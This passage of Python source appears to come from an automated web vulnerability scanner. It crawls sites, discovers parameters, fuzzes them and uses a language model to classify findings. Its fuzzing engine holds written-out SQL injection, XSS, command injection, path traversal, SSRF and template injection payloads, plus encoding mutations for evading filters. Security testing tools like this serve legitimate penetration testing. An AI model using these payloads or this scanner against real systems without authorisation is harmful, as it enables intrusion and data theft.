        if any((keyword in url_lower for keyword in login_keywords)):
            return True
        if soup.find('input', {'type': 'password'}):
            return True
        return False

    def _extract_api_routes(self, soup: BeautifulSoup, base_url: str) -> List[str]:
        api_routes = []
        api_patterns = ['/api/', '/v1/', '/v2/', '/v3/', '/rest/', '/graphql', '/swagger', '/openapi']
        for a in soup.find_all('a', href=True):
            href = a['href']
            if any((pattern in href for pattern in api_patterns)):
                api_routes.append(urljoin(base_url, href))
        for script in soup.find_all('script'):
            if script.string:
                for pattern in api_patterns:
                    if pattern in script.string:
                        matches = re.findall('["\\\'](/[^"\\\']*' + re.escape(pattern) + '[^"\\\']*)["\\\']', script.string)
                        for match in matches:
                            api_routes.append(urljoin(base_url, match))
        return list(set(api_routes))

    def _extract_parameters(self, url: str, soup: BeautifulSoup) -> List[str]:
        parameters = []
        parsed = urlparse(url)
        url_params = parse_qs(parsed.query)
        parameters.extend(url_params.keys())
        for form in soup.find_all('form'):
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                name = input_tag.get('name', '')
                if name:
                    parameters.append(name)
        return list(set(parameters))

    def _is_valid_url(self, url: str) -> bool:
        parsed = urlparse(url)
        if not parsed.scheme or not parsed.netloc:
            return False
        if parsed.scheme not in ['http', 'https']:
            return False
        if not Config.CRAWLER_EXTERNAL_LINKS:
            if parsed.netloc != self.base_domain:
                return False
        static_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.css', '.js', '.ico', '.pdf', '.doc', '.docx', '.zip']
        if any((parsed.path.lower().endswith(ext) for ext in static_extensions)):
            return False
        return True

    def _get_domain(self, url: str) -> str:
        parsed = urlparse(url)
        return parsed.netloc

    def get_stats(self) -> Dict:
        return self.stats

class ParameterDiscoverySystem:

    def __init__(self, http_client=None):
        self.http = http_client
        self.logger = logging.getLogger('parameter-discovery')
        self.discovered_parameters = set()
        self.parameter_clusters = defaultdict(list)

    async def discover_all(self, target_url: str, crawled_pages: List[Dict]) -> List[str]:
        self.discovered_parameters.clear()
        self.parameter_clusters = defaultdict(list)
        all_params = []
        path_guess = self.suggest_parameters(target_url)
        all_params.extend(path_guess[:100])
        if Config.PARAM_DISCOVERY_FROM_URL:
            url_params = self._discover_from_urls(crawled_pages)
            all_params.extend(url_params)
            all_params.extend(self._discover_from_page_links(crawled_pages))
            all_params.extend(self._discover_from_crawl_bundles(crawled_pages))
        if Config.PARAM_DISCOVERY_FROM_FORMS:
            form_params = self._discover_from_forms(crawled_pages)
            all_params.extend(form_params)
        if Config.PARAM_DISCOVERY_FROM_JS:
            js_params = await self._discover_from_js(crawled_pages)
            all_params.extend(js_params)
        if Config.PARAM_DISCOVERY_FROM_JSON:
            json_params = await self._discover_from_json(crawled_pages)
            all_params.extend(json_params)
        if Config.PARAM_DISCOVERY_FROM_API:
            api_params = await self._discover_from_apis(crawled_pages)
            all_params.extend(api_params)
        if Config.PARAM_DISCOVERY_FROM_HIDDEN_INPUTS:
            hidden_params = self._discover_from_hidden_inputs(crawled_pages)
            all_params.extend(hidden_params)
        if Config.PARAM_DISCOVERY_FROM_HEADERS:
            all_params.extend(self._discover_from_headers(crawled_pages))
        if Config.PARAM_DISCOVERY_FROM_COOKIES:
            all_params.extend(self._discover_from_cookies(crawled_pages))
        if Config.PARAM_DUPLICATE_REMOVAL:
            all_params = list(set(all_params))
        if Config.PARAM_CLUSTERING:
            self._cluster_parameters(all_params)
        self.discovered_parameters.update(all_params)
        return list(self.discovered_parameters)[:Config.PARAM_MAX_TOTAL_PARAMETERS]

    def _discover_from_page_links(self, pages: List[Dict]) -> List[str]:
        params = []
        for page in pages:
            for link in page.get('links', []):
                try:
                    q = parse_qs(urlparse(link).query)
                    params.extend(q.keys())
                except Exception:
                    continue
        return params

    def _discover_from_crawl_bundles(self, pages: List[Dict]) -> List[str]:
        out = []
        for page in pages:
            out.extend(page.get('parameters', []) or [])
            out.extend(page.get('param_hints', []) or [])
        return out

    def _discover_from_urls(self, pages: List[Dict]) -> List[str]:
        params = []
        for page in pages:
            parsed = urlparse(page['url'])
            url_params = parse_qs(parsed.query)
            params.extend(url_params.keys())
        return params

    def _discover_from_forms(self, pages: List[Dict]) -> List[str]:
        params = []
        for page in pages:
            for form in page.get('forms', []):
                for input_info in form.get('inputs', []):
                    if input_info.get('name'):
                        params.append(input_info['name'])
        return params

    async def _discover_from_js(self, pages: List[Dict]) -> List[str]:
        params = []
        param_patterns = ['([a-zA-Z_][a-zA-Z0-9_]*)\\s*[:=]\\s*["\\\']([^"\\\']+)["\\\']', '\\.(?:get|post|put|delete|patch)\\s*\\(\\s*["\\\']([^"\\\']+)["\\\']', 'param\\([\\\'"]([^\\\'"]+)[\\\'"]', 'parameter\\([\\\'"]([^\\\'"]+)[\\\'"]', '(?:query|body|params)\\.([a-zA-Z_][a-zA-Z0-9_]*)', '\\?[^\\s"\\\']+([a-zA-Z_][\\w-]{0,64})=', '[&]([a-zA-Z_][\\w-]{0,64})=', 'FormData\\s*\\([^)]*\\)\\.(?:append|set)\\s*\\(\\s*["\\\'](\\w+)["\\\']', '(?:searchParams|URLSearchParams)[^(]*\\)\\.(?:get|has)\\s*\\(\\s*["\\\'](\\w+)["\\\']', '(?:headers|defaultParams)\\s*[=:]\\s*\\{([^}]{1,400})\\}']
        js_limit = getattr(Config, 'PARAM_JS_FILES_PER_PAGE', 20)
        for page in pages:
            for script_url in page.get('scripts', [])[:js_limit]:
                text = await self._fetch_js(script_url)
                if not text:
                    continue
                if len(text) > 2000000:
                    text = text[:2000000]
                for pattern in param_patterns:
                    try:
                        for match in re.findall(pattern, text, re.I):
                            if isinstance(match, tuple):
                                for part in match:
                                    self._push_js_token(params, part)
                            else:
                                self._push_js_token(params, match)
                    except re.error:
                        continue
        return params

    @staticmethod
    def _push_js_token(params: List[str], token: str):
        if not token or len(token) < 2:
            return
        token = token.strip()
        if token.startswith('{') or 'function' in token or len(token) > 200:
            for m in re.finditer('["\\\'](\\w{2,48})["\\\']\\s*:', token):
                params.append(m.group(1))
            return
        if token.isdigit():
            return
        params.append(token)

    async def _discover_from_json(self, pages: List[Dict]) -> List[str]:
        params = []

        def extract_keys(obj, prefix=''):
            keys = []
            if isinstance(obj, dict):
                for (key, value) in obj.items():
                    full_key = f'{prefix}.{key}' if prefix else key
                    keys.append(full_key)
                    keys.append(key)
                    if isinstance(value, (dict, list)):
                        keys.extend(extract_keys(value, full_key))
            elif isinstance(obj, list) and obj:
                if isinstance(obj[0], dict):
                    keys.extend(extract_keys(obj[0], f'{prefix}[]'))
            return keys
        ep_max = getattr(Config, 'PARAM_JSON_ENDPOINTS_MAX', 24)
        seen_ep = set()
        for page in pages:
            candidates = []
            candidates.extend(page.get('api_routes', []) or [])
            for u in page.get('links', []):
                lu = (u or '').lower()
                if any((x in lu for x in ('/api/', '/graphql', '/v1/', '/v2/', '/rest/', '.json', 'format=json'))):
                    candidates.append(u)
            for endpoint in candidates:
                if len(seen_ep) >= ep_max:
                    break
                if endpoint in seen_ep:
                    continue
                seen_ep.add(endpoint)
                qkeys = list(parse_qs(urlparse(endpoint).query).keys())
                params.extend(qkeys)
                response = await self._fetch_json(endpoint)
                if response:
                    params.extend(extract_keys(response))
        return params

    async def _discover_from_apis(self, pages: List[Dict]) -> List[str]:
        params = []
        cap = getattr(Config, 'PARAM_API_PROBE_MAX', 24)
        seen = set()
        for page in pages:
            for api_url in page.get('api_routes', [])[:cap]:
                if api_url in seen:
                    continue
                seen.add(api_url)
                params.extend(parse_qs(urlparse(api_url).query).keys())
                response = await self._call_api(api_url)
                if response:
                    params.extend(self._extract_api_params(response))
        return params

    def _discover_from_hidden_inputs(self, pages: List[Dict]) -> List[str]:
        params = []
        for page in pages:
            for form in page.get('forms', []):
                for input_info in form.get('inputs', []):
                    if input_info.get('type') == 'hidden' and input_info.get('name'):
                        params.append(input_info['name'])
        return params

    def _discover_from_headers(self, pages: List[Dict]) -> List[str]:
        params = []
        for page in pages:
            hdrs = page.get('response_headers') or {}
            for k in hdrs.keys():
                kl = k.lower().replace('_', '-')
                if kl.startswith(('x-', 'cf-')) or kl in ('server', 'via', 'retry-after'):
                    params.append(k)
        return params

    def _discover_from_cookies(self, pages: List[Dict]) -> List[str]:
        names = []
        for page in pages:
            hdrs = page.get('response_headers') or {}
            raw = hdrs.get('Set-Cookie') or hdrs.get('set-cookie')
            if not raw:
                continue
            chunks = raw if isinstance(raw, list) else [raw]
            for line in chunks:
                if '=' in line:
                    names.append(line.split('=', 1)[0].strip())
        return names

    async def _fetch_js(self, url: str) -> Optional[str]:
        try:
            if self.http:
                r = await self.http.get(url)
                if r and r.get('content'):
                    return r['content']
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=10, ssl=False) as response:
                    if response.status == 200:
                        return await response.text()
        except Exception:
            pass
        return None

    async def _fetch_json(self, url: str) -> Optional[Dict]:
        try:
            if self.http:
                r = await self.http.get(url)
                if not r:
                    return None
                ctype = (r.get('headers') or {}).get('Content-Type', '')
                if 'json' in ctype.lower() or isinstance(r.get('content'), (dict, list)):
                    c = r.get('content', '')
                    if isinstance(c, dict):
                        return c
                    if isinstance(c, str) and c.strip().startswith('{'):
                        return json.loads(c)
                    return None
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=12, ssl=False) as response:
                    if response.status == 200:
                        ctype = response.headers.get('Content-Type', '')
                        if 'json' in ctype.lower():
                            return await response.json(content_type=None)
        except Exception:
            pass
        return None

    async def _call_api(self, url: str) -> Optional[Dict]:
        try:
            if self.http:
                r = await self.http.get(url)
                if not r or r.get('status', 0) >= 400:
                    return None
                ctype = (r.get('headers') or {}).get('Content-Type', '')
                if 'json' in ctype.lower():
                    c = r.get('content', '')
                    if isinstance(c, dict):
                        return c
                    if isinstance(c, str) and c.strip().startswith('{'):
                        try:
                            return json.loads(c)
                        except json.JSONDecodeError:
                            return None
                return None
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=12, ssl=False) as response:
                    if response.status == 200:
                        content_type = response.headers.get('Content-Type', '')
                        if 'application/json' in content_type:
                            return await response.json(content_type=None)
        except Exception:
            pass
        return None

    def _extract_api_params(self, response: Dict) -> List[str]:
        params = []
        if isinstance(response, dict):
            params.extend(response.keys())
        elif isinstance(response, list) and response:
            if isinstance(response[0], dict):
                params.extend(response[0].keys())
        return params

    def _cluster_parameters(self, params: List[str]):
        for param in params:
            if param.startswith(('user', 'usr')):
                self.parameter_clusters['user'].append(param)
            elif param.startswith(('id', 'uid', 'pid')):
                self.parameter_clusters['id'].append(param)
            elif param.startswith(('api', 'key')):
                self.parameter_clusters['api'].append(param)
            elif param.startswith(('page', 'limit', 'offset')):
                self.parameter_clusters['pagination'].append(param)
            else:
                self.parameter_clusters['other'].append(param)

    def suggest_parameters(self, url: str) -> List[str]:
        suggestions = []
        parsed = urlparse(url)
        if '/product/' in parsed.path or '/item/' in parsed.path:
            suggestions.extend(['id', 'product_id', 'pid', 'sku'])
        if '/user/' in parsed.path or '/profile/' in parsed.path:
            suggestions.extend(['id', 'user_id', 'uid', 'username'])
        if '/search' in parsed.path:
            suggestions.extend(['q', 'query', 'search', 'keyword'])
        if '/api/' in parsed.path:
            suggestions.extend(['api_key', 'token', 'auth', 'version'])
        if '/graphql' in parsed.path or 'graphql' in parsed.path:
            suggestions.extend(['query', 'variables', 'operationName'])
        for seg in parsed.path.strip('/').split('/'):
            if seg.isdigit():
                suggestions.extend(['id', 'item_id', 'pk'])
        suggestions.extend(Config.COMMON_PARAMETERS)
        return list(dict.fromkeys(suggestions))[:120]

    def get_clusters(self) -> Dict:
        return self.parameter_clusters

class AdvancedFuzzingEngine:

    def __init__(self, http_client):
        self.http = http_client
        self.logger = logging.getLogger('fuzzing-engine')
        self.payloads_generated = 0
        self.fuzzing_history = []

    async def fuzz_parameter(self, url: str, param_name: str, original_value: str='1', context: Dict=None) -> List[Dict]:
        results = []
        payloads = await self._generate_payloads(param_name, context)
        for payload in payloads[:Config.FUZZING_MAX_PAYLOADS_PER_PARAM]:
            mutated_payloads = self._apply_mutations(payload)
            for mutated in mutated_payloads:
                result = await self._test_payload(url, param_name, original_value, mutated)
                if result:
                    results.append(result)
                    self.fuzzing_history.append({'url': url, 'param': param_name, 'payload': mutated, 'result': result})
                    if result.get('interesting', False):
                        break
        return results

    async def _generate_payloads(self, param_name: str, context: Dict=None) -> List[str]:
        payloads = []
        if 'sql' in param_name.lower() or 'id' in param_name.lower():
            payloads.extend(["' OR '1'='1", "' UNION SELECT NULL--", "' AND SLEEP(5)--", "1' AND '1'='1", "1' AND '1'='2", "'; DROP TABLE users--", "' OR 1=1--", "' OR '1'='1'--", "' OR 1=1#", "' UNION ALL SELECT NULL--"])
        if 'search' in param_name.lower() or 'q' in param_name.lower() or 'query' in param_name.lower():
            payloads.extend(['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', 'javascript:alert(1)', '"><script>alert(1)</script>', "'><script>alert(1)</script>", '<svg onload=alert(1)>', '<body onload=alert(1)>', '<input onfocus=alert(1) autofocus>'])
        if 'cmd' in param_name.lower() or 'exec' in param_name.lower() or 'command' in param_name.lower():
            payloads.extend(['; id', '| id', '|| id', '& id', '&& id', '`id`', '$(id)', '| whoami', '| cat /etc/passwd', '| dir'])
        if 'file' in param_name.lower() or 'path' in param_name.lower() or 'dir' in param_name.lower():
            payloads.extend(['../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '/etc/passwd', 'C:\\windows\\win.ini', '....//....//....//etc/passwd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd'])
        if 'url' in param_name.lower() or 'uri' in param_name.lower() or 'redirect' in param_name.lower():
            payloads.extend(['http://169.254.169.254/latest/meta-data/', 'http://localhost:80', 'http://127.0.0.1:22', 'http://[::1]:80', 'file:///etc/passwd'])
        if not payloads:
            payloads = list(Config.COMMON_PARAMETERS[:24])
        if getattr(Config, 'FUZZING_ALWAYS_PROBE_GENERIC', True):
            generic = ["' OR '1'='1'--", '" OR "1"="1"--', "1' AND '1'='1", '1 AND 1=1', '1 AND 1=2', "admin'--", "' UNION SELECT NULL,NULL--", '<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', 'javascript:alert(1)', '{{7*7}}', '${7*7}', '<%= 7*7 %>', '{% raw 7*7 %}', '../../../etc/passwd%00', '....//....//....//etc/passwd', 'http://127.0.0.1:80/', 'http://169.254.169.254/latest/meta-data/', '| ping -n 1 127.0.0.1', '; sleep 0', "';waitfor delay '0:0:5'--"]
            cap = getattr(Config, 'FUZZING_GENERIC_CAP', 16)
            seen = set(payloads)
            for p in generic[:cap]:
                if p not in seen:
                    payloads.append(p)
                    seen.add(p)
        self.payloads_generated += len(payloads)
        return payloads

    def _apply_mutations(self, payload: str) -> List[str]:
        if not Config.FUZZING_AUTO_MUTATION:
            return [payload]
        mutations = [payload]
        mutations.append(''.join((c.upper() if i % 2 else c.lower() for (i, c) in enumerate(payload))))
        mutations.append(quote(payload))
        mutations.append(quote(quote(payload)))
        mutations.append(''.join((f'&#{ord(c)};' for c in payload)))
        mutations.append('0x' + ''.join((hex(ord(c))[2:] for c in payload)))
        mutations.append(payload.replace(' ', '\x00'))
        mutations.append(payload.replace(' ', '/**/'))
        mutations.append(payload.replace(' ', '/*!*/'))
        mutations.append(payload.replace(' ', '\t'))
        mutations.append(payload.replace(' ', '\n'))
        mutations.append(payload.replace(' ', '\r\n'))
        return list(set(mutations))[:10]

    async def _test_payload(self, url: str, param_name: str, original_value: str, payload: str) -> Optional[Dict]:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param_name] = [payload]
        new_query = urlencode(params, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        try:
            start_time = time.time()
            response = await self.http.get(test_url)
            elapsed = time.time() - start_time
            if not response:
                return None
            result = {'url': test_url, 'param': param_name, 'payload': payload, 'status': response.get('status', 0), 'length': len(response.get('content', '')), 'time': elapsed, 'interesting': False, 'evidence': ''}
            raw_content = response.get('content', '') or ''
            content = raw_content.lower()
            payload_l = payload.lower()
            try:
                dec = unquote(payload)
            except Exception:
                dec = payload
            sql_patterns = ['sql syntax', 'mysql', 'mysqli', 'postgresql', 'postgres', 'ora-', 'oracle', 'sqlite', 'sqlite3', 'mssql', 'odbc', 'jdbc', 'syntax error', 'unclosed quotation', 'quoted string not properly terminated', 'you have an error in your sql', 'warning: mysql', 'mysqli_query', 'pg_query', 'sqlstate', 'driver', 'nested exception']
            if any((p in content for p in sql_patterns)):
                result['interesting'] = True
                result['evidence'] = 'SQL/database error pattern'
            if ('<' in payload and '>' in payload) and (payload in raw_content or payload_l in content):
                result['interesting'] = True
                result['evidence'] = 'Payload reflected (XSS candidate)'
            elif dec != payload and dec.lower() in content:
                result['interesting'] = True
                result['evidence'] = 'Decoded payload reflected'
            if ('7*7' in payload or '${7*7}' in payload or '{{7*7}}' in payload) and '49' in raw_content:
                result['interesting'] = True
                result['evidence'] = 'Possible template evaluation (SSTI)'
            cmd_patterns = ['uid=', 'gid=', 'groups=', 'root:x:', '[boot loader]', 'microsoft windows', 'volume serial', 'whoami', 'net user', '/bin/', 'c:\\windows']
            if any((pattern in content for pattern in cmd_patterns)):
                result['interesting'] = True
                result['evidence'] = 'Command or system output pattern'
            if 'root:x:0:' in content or '[fonts]' in content or 'for 16-bit app support' in content:
                result['interesting'] = True
                result['evidence'] = 'File content pattern (LFI)'
            nosql_hints = ['$where', '$ne', '$gt', 'cannot read property', 'mongo']
            if any((h in content for h in nosql_hints)):
                result['interesting'] = True
                result['evidence'] = 'NoSQL / document DB error hint'
            if elapsed > 5:
                result['interesting'] = True
                result['evidence'] = f'Time delay: {elapsed:.2f}s'
            return result
        except Exception as e:
            self.logger.debug(f'Error testing payload: {e}')
            return None

    def get_stats(self) -> Dict:
        return {'payloads_generated': self.payloads_generated, 'tests_performed': len(self.fuzzing_history), 'interesting_findings': len([h for h in self.fuzzing_history if h['result'].get('interesting')])}

class ResponseAnalyzer:

    def __init__(self):
        self.client = None
        self.enabled = False
        self.logger = logging.getLogger('response-analyzer')
        self.analysis_history = []
        self.refresh_connection()

    def refresh_connection(self):
        self.client = None
        self.enabled = False
        if not getattr(Config, 'AI_ANALYZER_ENABLED', False):
            return
        key = (Config.DEEPSEEK_API_KEY or '').strip()
        if not key:
            return
        try:
            self.client = AsyncOpenAI(api_key=key, base_url='https://api.deepseek.com')
            self.enabled = True
            self.logger.info('Remote analyzer ready')
        except Exception as e:
            self.logger.error('Remote analyzer init failed: %s', e)
            self.client = None
            self.enabled = False

    async def analyze_response(self, response: Dict, context: Dict=None) -> Dict:
        if not self.enabled or not self.client:
            return {'analysis': 'disabled', 'anomaly': False}
        prompt = f"\n        Analyze this HTTP response for security anomalies:\n        \n        URL: {context.get('url', 'unknown')}\n        Parameter: {context.get('param', 'unknown')}\n        Payload: {context.get('payload', 'unknown')}\n        \n        Status Code: {response.get('status', 0)}\n        Content Length: {len(response.get('content', ''))}\n        \n        Response Preview:\n        {response.get('content', '')[:500]}\n        \n        Look for:\n        1. SQL error messages\n        2. Stack traces\n        3. Database errors\n        4. Command output\n        5. File content\n        6. XSS reflections\n        7. Unusual behavior\n        \n        Return JSON with:\n        - anomaly_detected: true/false\n        - confidence: 0-100\n        - anomaly_type: type of anomaly\n        - evidence: what was found\n        - severity: low/medium/high/critical\n        "
        try:
            ai_response = await self.client.chat.completions.create(model=Config.AI_MODEL, messages=[{'role': 'user', 'content': prompt}], temperature=0.3, max_tokens=500)
            result = self._parse_ai_response(ai_response.choices[0].message.content)
            self.analysis_history.append(result)
            return result
        except Exception as e:
            self.logger.error('Response analysis failed: %s', e)
            return {'analysis': str(e), 'anomaly': False}

    async def classify_vulnerability(self, finding: Dict) -> Dict:
        if not self.enabled or not self.client:
            return {'classification': 'unknown'}
        prompt = f"\n        Classify this security finding:\n        \n        URL: {finding.get('url', 'unknown')}\n        Parameter: {finding.get('param', 'unknown')}\n        Payload: {finding.get('payload', 'unknown')}\n        Evidence: {finding.get('evidence', 'unknown')}\n        \n        Possible classifications:\n        - SQL Injection\n        - Cross-Site Scripting (XSS)\n        - Command Injection\n        - Local File Inclusion (LFI)\n        - Remote File Inclusion (RFI)\n        - Server-Side Request Forgery (SSRF)\n        - Open Redirect\n        - Information Disclosure\n        - Other\n        \n        Return JSON with:\n        - classification: the vulnerability type\n        - confidence: 0-100\n        - explanation: why you think so\n        - cwe: CWE identifier if known\n        - cvss_score: estimated CVSS score\n        "
        try:
            ai_response = await self.client.chat.completions.create(model=Config.AI_MODEL, messages=[{'role': 'user', 'content': prompt}], temperature=0.2, max_tokens=300)
            return self._parse_ai_response(ai_response.choices[0].message.content)
        except Exception as e:
            self.logger.error('Classification failed: %s', e)
            return {'classification': 'unknown', 'error': str(e)}

    async def suggest_deeper_scans(self, findings: List[Dict]) -> List[str]:
        if not self.enabled or not self.client or (not findings):
            return []
        findings_summary = '\n'.join([f"- {f.get('type', 'unknown')}: {f.get('url', 'unknown')} ({f.get('evidence', '')})" for f in findings[:5]])
        prompt = f'\n        Based on these findings, suggest deeper security scans:\n        \n        {findings_summary}\n        \n        Suggest specific scans that would be useful:\n        1. SQL injection deeper testing\n        2. XSS in different contexts\n        3. LFI with wrappers\n        4. SSRF with different protocols\n        5. API endpoint fuzzing\n        6. Authentication testing\n        7. Business logic testing\n        \n        Return as JSON array of strings.\n        '
        try:
            ai_response = await self.client.chat.completions.create(model=Config.AI_MODEL, messages=[{'role': 'user', 'content': prompt}], temperature=0.4, max_tokens=200)
            return self._parse_ai_array(ai_response.choices[0].message.content)
        except Exception as e:
            self.logger.error('Suggestion failed: %s', e)
            return []

    async def check_false_positive(self, finding: Dict) -> Dict:
        if not self.enabled or not self.client:
            return {'is_false_positive': False, 'confidence': 50}
        prompt = f"\n        Analyze if this is a true vulnerability or false positive:\n        \n        URL: {finding.get('url', 'unknown')}\n        Parameter: {finding.get('param', 'unknown')}\n        Payload: {finding.get('payload', 'unknown')}\n        Evidence: {finding.get('evidence', 'unknown')}\n        \n        Consider:\n        1. Could this be a legitimate error?\n        2. Is the evidence reliable?\n        3. Could this be triggered by normal behavior?\n        4. Is the payload likely to be properly escaped?\n        \n        Return JSON with:\n        - is_false_positive: true/false\n        - confidence: 0-100\n        - reasoning: explanation\n        "
        try:
            ai_response = await self.client.chat.completions.create(model=Config.AI_MODEL, messages=[{'role': 'user', 'content': prompt}], temperature=0.1, max_tokens=300)
            return self._parse_ai_response(ai_response.choices[0].message.content)
        except Exception as e:
            self.logger.error('False-positive check failed: %s', e)
            return {'is_false_positive': False, 'confidence': 50, 'error': str(e)}

    async def explain_vulnerability(self, finding: Dict) -> str:
        if not self.enabled or not self.client:
            return ''
        prompt = f"\n        Explain this vulnerability in simple terms:\n        \n        Type: {finding.get('type', 'unknown')}\n        URL: {finding.get('url', 'unknown')}\n        Parameter: {finding.get('param', 'unknown')}\n        Evidence: {finding.get('evidence', 'unknown')}\n        \n        Provide:\n        1. What is this vulnerability?\n        2. Why is it dangerous?\n        3. How can an attacker exploit it?\n        4. What data could be exposed?\n        5. How to fix it?\n        \n        Keep it clear and actionable.\n        "
        try:
            ai_response = await self.client.chat.completions.create(model=Config.AI_MODEL, messages=[{'role': 'user', 'content': prompt}], temperature=0.5, max_tokens=400)
            return ai_response.choices[0].message.content
        except Exception as e:
            self.logger.error('Explanation failed: %s', e)
            return f'Failed to generate explanation: {str(e)}'

    async def generate_scan_strategy(self, target: str, initial_info: Dict) -> str:
        if not self.enabled or not self.client:
            return 'Use standard scan: crawl -> parameter discovery -> fuzzing -> analysis'
        prompt = f"\n        Generate an optimal scan strategy for this target:\n        \n        Target: {target}\n        Technologies detected: {initial_info.get('technologies', 'unknown')}\n        WAF detected: {initial_info.get('waf', 'none')}\n        \n        Suggest step-by-step scan approach including:\n        1. Initial reconnaissance\n        2. Crawling strategy\n        3. Parameter discovery methods\n        4. Fuzzing techniques to prioritize\n        5. Vulnerability types to focus on\n        6. Stealth considerations\n        7. Time optimization\n        \n        Make it specific to this target.\n        "
        try:
            ai_response = await self.client.chat.completions.create(model=Config.AI_MODEL, messages=[{'role': 'user', 'content': prompt}], temperature=0.4, max_tokens=600)
            return ai_response.choices[0].message.content
        except Exception as e:
            self.logger.error('Strategy generation failed: %s', e)
            return 'Standard scan strategy recommended'

    def _parse_ai_response(self, response: str) -> Dict:
        try:
            json_match = re.search('\\{.*\\}', response, re.DOTALL)
            if json_match:
                return json.loads(json_match.group())
            return {'analysis': response}
        except Exception as e:
            return {'analysis': response, 'parse_error': str(e)}

    def _parse_ai_array(self, response: str) -> List[str]:
        try:
            array_match = re.search('\\[.*\\]', response, re.DOTALL)
            if array_match:
                return json.loads(array_match.group())
            lines = response.split('\n')
            suggestions = []
            for line in lines:
                if line.strip() and (not line.startswith('#')):
                    suggestions.append(line.strip())
            return suggestions
        except Exception as e:
            return []

    def get_stats(self) -> Dict:
        return {'enabled': self.enabled, 'analyses_performed': len(self.analysis_history), 'anomalies_detected': len([a for a in self.analysis_history if a.get('anomaly_detected')])}

class AttackSurfaceMapper:

    def __init__(self):
        self.logger = logging.getLogger('attack-surface-mapper')
        self.surface = {'endpoints': [], 'parameters': [], 'forms': [], 'apis': [], 'login_systems': [], 'upload_areas': [], 'admin_panels': [], 'graph': None}

    def map_from_crawl(self, crawled_pages: List[Dict]) -> Dict:
        for page in crawled_pages:
            url = page.get('url', '')
            self.surface['endpoints'].append({'url': url, 'status': page.get('status_code', 0), 'title': page.get('title', ''), 'depth': page.get('depth', 0)})
            for param in page.get('parameters', []):
                self.surface['parameters'].append({'name': param, 'url': url, 'source': 'url'})
            for form in page.get('forms', []):
                self.surface['forms'].append({'action': form.get('action', ''), 'method': form.get('method', 'GET'), 'inputs': form.get('inputs', []), 'url': url})
            for api in page.get('api_routes', []):
                self.surface['apis'].append({'url': api, 'source': url})
            if page.get('is_login'):
                self.surface['login_systems'].append({'url': url, 'forms': page.get('forms', [])})
            if page.get('has_upload'):
                self.surface['upload_areas'].append({'url': url, 'forms': [f for f in page.get('forms', []) if any((i.get('type') == 'file' for i in f.get('inputs', [])))]})
            if page.get('is_admin'):
                self.surface['admin_panels'].append({'url': url, 'title': page.get('title', '')})
        if Config.GENERATE_VISUAL_GRAPH:
            self.surface['graph'] = self._generate_graph()
        return self.surface

    def _generate_graph(self) -> Dict:
        graph = {'nodes': [], 'edges': []}
        if self.surface['endpoints']:
            graph['nodes'].append({'id': 'target', 'label': 'Target', 'type': 'target'})
        for (i, endpoint) in enumerate(self.surface['endpoints'][:Config.GRAPH_MAX_NODES]):
            node_id = f'endpoint_{i}'
            graph['nodes'].append({'id': node_id, 'label': endpoint['url'][:30] + '...' if len(endpoint['url']) > 30 else endpoint['url'], 'type': 'endpoint', 'url': endpoint['url']})
            graph['edges'].append({'from': 'target', 'to': node_id})
        for (i, param) in enumerate(self.surface['parameters'][:Config.GRAPH_MAX_NODES]):
            node_id = f'param_{i}'
            graph['nodes'].append({'id': node_id, 'label': param['name'], 'type': 'parameter', 'url': param['url']})
            for (j, endpoint) in enumerate(self.surface['endpoints']):
                if endpoint['url'] == param['url']:
                    graph['edges'].append({'from': f'endpoint_{j}', 'to': node_id})
                    break
        for (i, api) in enumerate(self.surface['apis'][:Config.GRAPH_MAX_NODES]):
            node_id = f'api_{i}'
            graph['nodes'].append({'id': node_id, 'label': api['url'][:30] + '...' if len(api['url']) > 30 else api['url'], 'type': 'api'})
            graph['edges'].append({'from': 'target', 'to': node_id})
        for (i, login) in enumerate(self.surface['login_systems'][:10]):
            node_id = f'login_{i}'
            graph['nodes'].append({'id': node_id, 'label': 'Login: ' + (login['url'][:30] + '...' if len(login['url']) > 30 else login['url']), 'type': 'login', 'url': login['url']})
            graph['edges'].append({'from': 'target', 'to': node_id})
        for (i, upload) in enumerate(self.surface['upload_areas'][:10]):
            node_id = f'upload_{i}'
            graph['nodes'].append({'id': node_id, 'label': 'Upload: ' + (upload['url'][:30] + '...' if len(upload['url']) > 30 else upload['url']), 'type': 'upload', 'url': upload['url']})
            graph['edges'].append({'from': 'target', 'to': node_id})
        for (i, admin) in enumerate(self.surface['admin_panels'][:10]):
            node_id = f'admin_{i}'
            graph['nodes'].append({'id': node_id, 'label': 'Admin: ' + (admin['url'][:30] + '...' if len(admin['url']) > 30 else admin['url']), 'type': 'admin', 'url': admin['url']})
            graph['edges'].append({'from': 'target', 'to': node_id})
        return graph

    def get_summary(self) -> Dict:
        return {'total_endpoints': len(self.surface['endpoints']), 'total_parameters': len(self.surface['parameters']), 'total_forms': len(self.surface['forms']), 'total_apis': len(self.surface['apis']), 'login_systems': len(self.surface['login_systems']), 'upload_areas': len(self.surface['upload_areas']), 'admin_panels': len(self.surface['admin_panels'])}

class WAFDetectionSystem:

    def __init__(self, http_client):
        self.http = http_client
        self.logger = logging.getLogger('waf-detection')
